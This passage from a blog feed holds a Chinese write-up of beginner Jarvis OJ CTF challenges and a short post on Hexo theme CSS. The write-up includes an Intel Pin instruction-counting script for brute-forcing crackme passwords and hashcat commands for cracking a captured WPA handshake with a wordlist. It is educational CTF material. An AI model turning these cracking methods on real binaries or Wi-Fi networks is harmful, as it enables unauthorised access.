class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">28</span>]; <span class="comment">// [rsp+10h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0xAB</span>u;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">0xDD</span>u;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">0x33</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">0x54</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">0x35</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">0xEF</span>u;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input your password:"</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%s"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v6) == <span class="number">26</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( (v6[<span class="number">0</span>] ^ <span class="number">0xAB</span>) == list1[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( (v6[v3 + <span class="number">1</span>] ^ v5[(v3 + <span class="number">1</span>) % <span class="number">6</span>]) == list1[v3 + <span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ++v3 == <span class="number">25</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Congratulations!"</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Password Wrong!! Please try again."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来尝试一下不同的解法</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> list1[] = &#123;</span><br><span class="line">  <span class="number">0xFB</span>, <span class="number">0x9E</span>, <span class="number">0x67</span>, <span class="number">0x12</span>, <span class="number">0x4E</span>, <span class="number">0x9D</span>, <span class="number">0x98</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x46</span>, <span class="number">0x8A</span>, <span class="number">0xF4</span>, <span class="number">0xB4</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xDC</span>, <span class="number">0xD9</span>, <span class="number">0xA4</span>, </span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0x31</span>, <span class="number">0x74</span>, <span class="number">0x9C</span>, <span class="number">0xD2</span>, <span class="number">0xA0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> v5[] = &#123;</span><br><span class="line">    <span class="number">0xAB</span>, <span class="number">0xDD</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x35</span>, <span class="number">0xEF</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">27</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c = <span class="string">' '</span>; c &lt;= <span class="string">'~'</span>; c++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((c ^ v5[i % <span class="number">6</span>]) == list1[i]) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%c"</span>, c);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(<code>tcc -run -</code> 可以直接从标准输入读取代码然后执行, 妙啊妙啊)</p><p>flag <code>PCTF{r3v3Rse_i5_v3ry_eAsy}</code></p><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">list1 = [</span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0x9E</span>, <span class="number">0x67</span>, <span class="number">0x12</span>, <span class="number">0x4E</span>, <span class="number">0x9D</span>, <span class="number">0x98</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, </span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0x8A</span>, <span class="number">0xF4</span>, <span class="number">0xB4</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xDC</span>, <span class="number">0xD9</span>, <span class="number">0xA4</span>, </span><br><span class="line">    <span class="number">0x6C</span>, <span class="number">0x31</span>, <span class="number">0x74</span>, <span class="number">0x9C</span>, <span class="number">0xD2</span>, <span class="number">0xA0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line">v5 = [<span class="number">0xAB</span>, <span class="number">0xDD</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x35</span>, <span class="number">0xEF</span>]</span><br><span class="line">flag = [BitVec(<span class="string">f'f<span class="subst">&#123;i&#125;</span>'</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    solver.add((flag[i] ^ v5[i % <span class="number">6</span>]) == list1[i])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">assert</span> solver.check() == sat</span><br><span class="line">m = solver.model()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag:</span><br><span class="line">    print(chr(m[c].as_long()), end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>很快很棒棒</p><h2 id="pin"><a href="#pin" class="headerlink" title="pin"></a>pin</h2><p>M4x 师傅推荐的妙妙工具. 来尝试一下.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">PIN = <span class="string">'/home/aloxaf/Program/pin/pin'</span></span><br><span class="line">INSCOUNT32 = <span class="string">'/home/aloxaf/Program/pin/source/tools/ManualExamples/obj-ia32/inscount0.so'</span></span><br><span class="line">INSCOUNT64 = <span class="string">'/home/aloxaf/Program/pin/source/tools/ManualExamples/obj-intel64/inscount0.so'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pin</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, program, arch=<span class="number">32</span>, charset=printable, padding=<span class="string">'_'</span>)</span>:</span></span><br><span class="line">        self.program = program</span><br><span class="line">        self.inscount = INSCOUNT32 <span class="keyword">if</span> arch == <span class="number">32</span> <span class="keyword">else</span> INSCOUNT64</span><br><span class="line">        self.charset = charset</span><br><span class="line">        self.padding = padding</span><br><span class="line">        <span class="comment"># print(program)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_pin</span><span class="params">(self, payload)</span>:</span></span><br><span class="line">        args = [PIN, <span class="string">'-t'</span>, self.inscount, <span class="string">'--'</span>, self.program]</span><br><span class="line">        p = Popen(args, stdin=PIPE, stdout=PIPE)</span><br><span class="line">        out = p.communicate(payload.encode())</span><br><span class="line">        <span class="comment"># print(out)</span></span><br><span class="line">        <span class="keyword">return</span> int(open(<span class="string">'./inscount.out'</span>).read().split()[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">guess_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        inscount = []</span><br><span class="line">        payload = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">            payload += self.padding</span><br><span class="line">            inscount.append(self.run_pin(payload))</span><br><span class="line"></span><br><span class="line">            delta1 = inscount[<span class="number">-1</span>] - inscount[<span class="number">-2</span>] <span class="keyword">if</span> len(inscount) &gt;= <span class="number">2</span> <span class="keyword">else</span> <span class="keyword">None</span></span><br><span class="line">            delta2 = inscount[<span class="number">-2</span>] - inscount[<span class="number">-3</span>] <span class="keyword">if</span> len(inscount) &gt;= <span class="number">3</span> <span class="keyword">else</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">            print(<span class="string">'len=&#123;&#125;\tins=&#123;&#125;\tdelta=&#123;&#125;'</span>.format(</span><br><span class="line">                len(payload), inscount[<span class="number">-1</span>], delta1))</span><br><span class="line">            <span class="keyword">if</span> delta2 <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> delta1 != delta2:</span><br><span class="line">                self.len = len(payload)</span><br><span class="line"></span><br><span class="line">                print(<span class="string">f'key length is <span class="subst">&#123;self.len&#125;</span>? (y/n) '</span>, end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">if</span> input().strip() == <span class="string">'y'</span>:</span><br><span class="line">                    <span class="keyword">return</span> self.len</span><br><span class="line">        print(<span class="string">"Can't guess key length!\nPlease input your guess: "</span>, end=<span class="string">''</span>)</span><br><span class="line">        self.len = int(input())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">guess_key</span><span class="params">(self)</span>:</span></span><br><span class="line">        payload = [self.padding] * self.len</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.len):</span><br><span class="line">            inscount = []</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> self.charset:</span><br><span class="line">                payload[i] = c</span><br><span class="line">                _payload = <span class="string">''</span>.join(payload)</span><br><span class="line">                inscount.append(self.run_pin(_payload))</span><br><span class="line"></span><br><span class="line">                delta1 = inscount[<span class="number">-1</span>] - inscount[<span class="number">-2</span>] <span class="keyword">if</span> len(inscount) &gt;= <span class="number">2</span> <span class="keyword">else</span> <span class="keyword">None</span></span><br><span class="line">                delta2 = inscount[<span class="number">-2</span>] - inscount[<span class="number">-3</span>] <span class="keyword">if</span> len(inscount) &gt;= <span class="number">3</span> <span class="keyword">else</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">                print(<span class="string">'\rpayload:&#123;&#125;\tins=&#123;&#125;\tdelta=&#123;&#125;'</span>.format(</span><br><span class="line">                    _payload, inscount[<span class="number">-1</span>], delta1), end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">if</span> delta2 <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> delta1 != delta2:</span><br><span class="line">                    <span class="comment"># print(f'fount &#123;c&#125; !')</span></span><br><span class="line">                    print(<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"Didn't find password!"</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">        print(<span class="string">''</span>.join(payload))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(argv) != <span class="number">1</span>:</span><br><span class="line">        p = Pin(*argv[<span class="number">1</span>:])</span><br><span class="line">        <span class="keyword">if</span> p.guess_length():</span><br><span class="line">            p.guess_key()</span><br></pre></td></tr></table></figure><p>写得很长 = = , 因为进行了封装</p><p>看起来好像很划不来的样子, 不过这样可以重复利用~</p><h1 id="公倍数"><a href="#公倍数" class="headerlink" title="公倍数"></a>公倍数</h1><blockquote><p>请计算1000000000以内3或5的倍数之和。</p><p>如：10以内这样的数有3,5,6,9，和是23</p><p>请提交PCTF{你的答案}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_3 = (<span class="number">3</span> + <span class="number">1000000000</span> // <span class="number">3</span> * <span class="number">3</span>) * (<span class="number">1000000000</span> // <span class="number">3</span>) // <span class="number">2</span></span><br><span class="line">_5 = (<span class="number">5</span> + <span class="number">1000000000</span> - <span class="number">15</span>) * (<span class="number">1000000000</span> // <span class="number">5</span> - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">_15 = (<span class="number">15</span> + <span class="number">1000000000</span> // <span class="number">15</span> * <span class="number">15</span>) * (<span class="number">1000000000</span> // <span class="number">15</span>) // <span class="number">2</span></span><br><span class="line">print(_3 + _5 - _15)</span><br></pre></td></tr></table></figure><p>注意是 1000000000 <strong>以内</strong></p><h1 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h1><blockquote><p>出题人太懒，还是就丢 了个文件就走了，你能发现里面的秘密吗？</p></blockquote><p>file 一下. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">haha: Linux rev 1.0 ext2 filesystem data, UUID=8eecd08f-bae8-41ff-8497-8338f58ad15b</span><br></pre></td></tr></table></figure><p>挂上去发现一堆小文件, 里面各有一个字符<br>写个 zsh 脚本跑一下</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir loli</span><br><span class="line">sudo mount haha loli</span><br><span class="line"><span class="keyword">for</span> i (&#123;0..253&#125;) &#123;</span><br><span class="line">  cat <span class="variable">$i</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Haha ext2 file system is easy, and I know you can easily decompress of it and find the content in it.But the content is spilted in pieces can you make the pieces together. Now this is the flag PCTF&#123;P13c3_7oghter_i7&#125;. The rest is up to you. Cheer up, boy.</span><br></pre></td></tr></table></figure><h1 id="veryeasyRSA"><a href="#veryeasyRSA" class="headerlink" title="veryeasyRSA"></a>veryeasyRSA</h1><blockquote><p>已知RSA公钥生成参数：</p><p> p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 </p><p>e = 65537 </p><p>求d = </p><p>请提交PCTF{d}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">3487583947589437589237958723892346254777</span></span><br><span class="line">q = <span class="number">8767867843568934765983476584376578389</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">print(gmpy2.invert(e, (p<span class="number">-1</span>) * (q<span class="number">-1</span>)))</span><br></pre></td></tr></table></figure><h1 id="美丽的实验室logo"><a href="#美丽的实验室logo" class="headerlink" title="美丽的实验室logo"></a>美丽的实验室logo</h1><blockquote><p>出题人丢下个logo就走了，大家自己看着办吧</p></blockquote><p>拖到 StegSolve 里用 Frame Browser...... </p><p>还行......</p><h1 id="手贱"><a href="#手贱" class="headerlink" title="手贱"></a>手贱</h1><blockquote><p>某天A君的网站被日，管理员密码被改，死活登不上，去数据库一看，啥，这密码md5不是和原来一样吗？为啥登不上咧？</p><p>d78b6f302l25cdc811adfe8d4e7c9fd34</p><p>请提交PCTF{原来的管理员密码}</p></blockquote><p>多了一位, 某个不属于 hexdigits  的字符混进来了</p><h1 id="段子"><a href="#段子" class="headerlink" title="段子"></a>段子</h1><blockquote><p>程序猿圈子里有个非常著名的段子：</p><p>手持两把锟斤拷，口中疾呼烫烫烫。</p><p>请提交其中&quot;锟斤拷&quot;的十六进制编码。(大写)</p><p>FLAG: PCTF{你的答案}</p></blockquote><h1 id="段子-1"><a href="#段子-1" class="headerlink" title="段子"></a>段子</h1><blockquote><p>程序猿圈子里有个非常著名的段子：</p><p>手持两把锟斤拷，口中疾呼烫烫烫。</p><p>请提交其中&quot;锟斤拷&quot;的十六进制编码。(大写)</p><p>FLAG: PCTF{你的答案}</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.join(<span class="string">f'<span class="subst">&#123;i:X&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'锟斤拷'</span>.encode(<span class="string">'GBK'</span>))</span><br></pre></td></tr></table></figure><h1 id="veryeasy"><a href="#veryeasy" class="headerlink" title="veryeasy"></a>veryeasy</h1><blockquote><p>使用基本命令获取flag</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://dn.jarvisoj.com/challengefiles/veryeasy.d944f0e9f8d5fe5b358930023da97d1a --output - | grep -aoP <span class="string">'PCTF&#123;.+?&#125;'</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">curl https://dn.jarvisoj.com/challengefiles/veryeasy.d944f0e9f8d5fe5b358930023da97d1a --output - | strings | rg PCTF</span><br></pre></td></tr></table></figure><p>PCTF{strings_i5_3asy_isnt_i7} </p><h1 id="关于USS-Lab"><a href="#关于USS-Lab" class="headerlink" title="关于USS Lab."></a>关于USS Lab.</h1><blockquote><p>USS的英文全称是什么，请全部小写并使用下划线连接_，并在外面加上PCTF{}之后提交</p></blockquote><p><code>PCTF{ubiquitous_system_security}</code></p><h1 id="base64"><a href="#base64" class="headerlink" title="base64?"></a>base64?</h1><blockquote><p>GUYDIMZVGQ2DMN3CGRQTONJXGM3TINLGG42DGMZXGM3TINLGGY4DGNBXGYZTGNLGGY3DGNBWMU3WI===</p></blockquote><p>base32 再转 ASCII: <code>rax2 -s $(base32 -d)</code></p><p>结果 <code>PCTF{Just_t3st_h4v3_f4n}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;握手包&quot;&gt;&lt;a href=&quot;#握手包&quot; class=&quot;headerlink&quot; title=&quot;握手包&quot;&gt;&lt;/a&gt;握手包&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;给你握手包，flag是Flag_is_here这个AP的密码，自己看着办吧。&lt;/p&gt;
&lt;p&gt;提交格式：flag{WIFI密码}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用 hashcat 爆破, 以 Arch Linux 为例&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 安装必要工具&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo pacman -S hashcat hashcat-utils&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 格式转换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cap2hccapx wifi.cap wifi.hccapx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 用字典爆破&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hashcat -m 2500 wifi.hccapx 10k_most_common.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="ctf" scheme="https://www.aloxaf.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://www.aloxaf.com/tags/ctf/"/>
    
      <category term="writeup" scheme="https://www.aloxaf.com/tags/writeup/"/>
    
      <category term="misc" scheme="https://www.aloxaf.com/tags/misc/"/>
    
      <category term="crypto" scheme="https://www.aloxaf.com/tags/crypto/"/>
    
      <category term="reverse" scheme="https://www.aloxaf.com/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>改进hexo/cafe主题表格显示效果</title>
    <link href="https://www.aloxaf.com/2018/05/improve_hexo_table/"/>
    <id>https://www.aloxaf.com/2018/05/improve_hexo_table/</id>
    <published>2018-05-07T13:41:33.000Z</published>
    <updated>2018-05-07T13:41:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>总体是根据这篇文章来的<br><a href="http://ju.outofmemory.cn/entry/130935" target="_blank" rel="noopener">http://ju.outofmemory.cn/entry/130935</a></p><a id="more"></a><p>进入 themes/cafe/source/css/_partial<br>编辑article.styl, 将原来.article-entry下的table部分替换成如下代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span></span><br><span class="line">  <span class="selector-tag">border</span> 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-tag">black</span></span><br><span class="line">  <span class="selector-tag">border-collapse</span> <span class="selector-tag">collapse</span></span><br><span class="line"><span class="selector-tag">th</span></span><br><span class="line">  <span class="selector-tag">border-collapse</span> <span class="selector-tag">collapse</span></span><br><span class="line"><span class="selector-tag">td</span></span><br><span class="line">  <span class="selector-tag">border-collapse</span> <span class="selector-tag">collapse</span></span><br><span class="line">  <span class="selector-tag">padding</span> 1<span class="selector-tag">px</span> 8<span class="selector-tag">px</span> 1<span class="selector-tag">px</span></span><br></pre></td></tr></table></figure><p>编辑hightlight.styl, 在.hight.table下增加border 0px</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">table</span></span><br><span class="line">  <span class="selector-tag">margin</span>: 0</span><br><span class="line">  <span class="selector-tag">width</span>: <span class="selector-tag">auto</span></span><br><span class="line">  <span class="selector-tag">border</span> 0<span class="selector-tag">px</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>顺便可以将字体一块儿改了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.article-entry</span></span><br><span class="line">  <span class="selector-tag">pre</span>, <span class="selector-tag">code</span></span><br><span class="line">    <span class="selector-tag">font-family</span>: "<span class="selector-tag">Droid</span> <span class="selector-tag">Sans</span> <span class="selector-tag">Mono</span>", <span class="selector-tag">monospace</span>, <span class="selector-tag">font-mono</span>, <span class="selector-tag">Consolas</span>, "<span class="selector-tag">Source</span> <span class="selector-tag">Code</span> <span class="selector-tag">Pro</span>", "<span class="selector-tag">Microsoft</span> <span class="selector-tag">YaHei</span>"</span><br></pre></td></tr></table></figure><p>进入 themes/cafe/source/css</p><p>将下面代码注释掉</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.left</span>, <span class="selector-class">.alignleft</span></span><br><span class="line">  <span class="selector-tag">float</span>: <span class="selector-tag">left</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.right</span>, <span class="selector-class">.alignright</span></span><br><span class="line">  <span class="selector-tag">float</span>: <span class="selector-tag">right</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
